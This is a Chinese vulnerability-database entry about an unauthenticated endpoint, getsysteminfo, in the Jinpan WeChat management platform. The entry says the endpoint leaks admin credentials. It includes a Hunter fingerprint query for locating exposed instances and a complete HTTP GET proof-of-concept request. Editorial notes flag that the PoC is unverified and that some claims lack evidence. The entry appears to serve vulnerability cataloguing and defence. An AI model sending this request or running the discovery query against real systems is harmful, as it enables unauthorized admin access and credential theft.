---
source: "wy876 漏洞文库"
title: "金盘微信管理平台 getsysteminfo未授权账号信息泄露"
product: "金盘微信管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "声称<3.3.1"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fosg83r3n5fm40nv"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E7%9B%98%E7%B3%BB%E7%BB%9F/%E9%87%91%E7%9B%98%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0getsysteminfo%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.title="
hunter: "web.title=\"微信管理后台\"&&web.icon==\"0488faca4c19046b94d07c3ee83cf9d6\""
id: "vw-c910875a47e626bd0c8ce219"
entity_id: "ve-c910875a47e626bd0c8ce219"
schema_version: "1"
---

# 金盘微信管理平台 getsysteminfo未授权账号信息泄露

## 条目说明

- 对象与具体问题：金盘微信管理平台；getsysteminfo未授权账号信息泄露
- 版本、配置及部署条件：声称<3.3.1
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 版本边界有值但无官方公告，不能自行推出3.3.1确认修复
- 没有返回字段或口令格式，直接管理员登录缺证据
- 微信平台与图书馆系统产品模块应分清，不因金盘统一为同漏洞；影响班额本错字、Hunter误填fofa

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限。

## 二、影响班额本
+ 金盘微信管理平台<3.3.1

## 三、资产测绘
+ hunter`web.title="微信管理后台"&&web.icon=="0488faca4c19046b94d07c3ee83cf9d6"`
+ 登录页面


## 四、漏洞复现
通过`poc`获取账号密码

```http
GET /admin/weichatcfg/getsysteminfo HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


通过获取的账号密码登录后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fosg83r3n5fm40nv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
